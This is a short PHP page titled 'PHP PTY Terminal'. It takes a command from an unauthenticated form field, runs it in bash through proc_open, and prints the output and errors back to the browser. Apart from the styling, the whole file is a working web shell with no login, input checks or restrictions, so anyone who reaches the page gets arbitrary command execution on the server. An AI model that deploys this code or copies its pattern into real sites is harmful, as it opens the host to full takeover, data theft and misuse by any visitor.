<?php
// pty_terminal.php

// Set the content type to text/html
header('Content-Type: text/html; charset=utf-8');

// Start a new process
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"],  // stderr
];

$process = proc_open('bash', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Initialize output variable
    $output = '';
    $error = '';

    // Check if a command was sent
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Read the input command from the user
        $command = isset($_POST['command']) ? $_POST['command'] . "\n" : '';

        // Send command to the process
        fwrite($pipes[0], $command);

        // Close input pipe after sending command
        fclose($pipes[0]);

        // Read output and error streams
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);

        // Close output and error pipes
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close the process
        $return_value = proc_close($process);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP PTY Terminal</title>
    <style>
        body {
            font-family: monospace;
            background-color: #282c34;
            color: white;
            padding: 20px;
        }
        h1 {
            color: lightblue;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #61dafb;
            border-radius: 5px;
            background-color: #1e1e1e;
            color: white;
        }
        button {
            padding: 10px;
            background-color: #61dafb;
            border: none;
            border-radius: 5px;
            color: black;
            cursor: pointer;
        }
        button:hover {
            background-color: #21a1f1;
        }
        .output {
            background-color: #333;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .output .green { color: lightgreen; }
        .output .red { color: lightcoral; }
        .output .yellow { color: yellow; }
        .output .blue { color: lightblue; }
    </style>
</head>
<body>
    <h1>PHP PTY Terminal</h1>
    <form method="POST">
        <input type="text" name="command" placeholder="Enter command" required>
        <button type="submit">Execute</button>
    </form>
    <div class="output">
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <pre>
                <?php if ($output): ?>
                    <span class="green">Output:</span>
                    <?php echo htmlspecialchars($output); ?>
                <?php endif; ?>
                <?php if ($error): ?>
                    <span class="red">Error:</span>
                    <?php echo htmlspecialchars($error); ?>
                <?php endif; ?>
            </pre>
        <?php endif; ?>
    </div>
</body>
</html>
